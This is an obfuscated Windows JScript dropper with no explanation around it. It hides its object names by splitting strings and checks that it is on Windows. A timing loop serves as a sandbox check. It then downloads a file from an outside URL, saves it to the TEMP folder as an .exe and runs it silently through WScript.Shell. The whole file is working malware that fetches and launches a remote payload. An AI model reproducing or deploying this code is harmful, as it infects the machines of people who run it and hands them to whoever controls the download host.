var V0 = false;
var O = "Create"+"Object";
var TN = function QI() {return WScript[O]("WScript"+".Shell");}(), KV = 11;
var V = "MSXML2"+".XMLHTTP";
var T0 = 2;
var W = T0 - 2;
function D(UJ){TN["Run"](UJ, W, W);};
function OB(){return V + "";};
function RM(WG, A){W = W * 1; return WG - A;};
function DO(){return O;};
/*@cc_on
  @if (@_win32 || @_win64)
    V0 = true;
  @end
@*/
if (V0)
{
var U = "";
function MS(){return 22;};
var B0 = 0; var M = 0;
function Z()
{
var XT = new this["Date"]();
var BR = XT["getUTCMilliseconds"]();
WScript["Sleep"](MS());
var XT = new this["Date"]();
var S = XT["getUTCMilliseconds"]();
WScript["Sleep"](MS());
var XT = new this["Date"]();
var FB = XT["getUTCMilliseconds"]();
var B0 = "F";
B0 = RM(S, BR);
var M = "LJ";
M = RM(FB, S);
U = "open";
return RM(B0, M);
}
var WW = false;
var TX = false;
for (var MQ = W; MQ < MS() * 1; MQ++){if (Z() != W){
WW = true; 
M = "31" + 11 * B0 + M; 
TX = true; 
break;
}}
function B() {return ((WW == true) && (WW == TX)) ? 1 : W;};
if (WW && B() && TX){
function T() {return TN["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "5QENfnIX.ex" + "e";};
 WW0 = OB();
 Z0 = WScript[O](WW0);
 var D0 = 1;
do { 
	for (;D0;){
	try {
		if (D0 == 1)
		{
			Z0[U]("GET", "http://ekotrade.pl/m4ujda", false);
			Z0["send"]();
			CT = "Sleep";
			D0 = 2;
		}
		WScript[CT](MS() + 120); 
		if (Z0["readystate"] < 2 * 2) continue;
		D0 = W;
		function Y(RH) {var H = (1, 2, 3, 4, 5, RH); return H;};
		I = WScript[DO()]("ADODB.Stream");
		WW0 = I;
		WW0[U]();
		WW0["type"] = Y(1);
		WW0["write"](Z0["ResponseBody"]);
		I["position"] = Y(W);
		WW0["Save" + "ToFile"](T(), 2);
		I["cl"+"ose"]();
		E = T();
		D(E);
	} catch(P){};};
}while (D0);
}
}

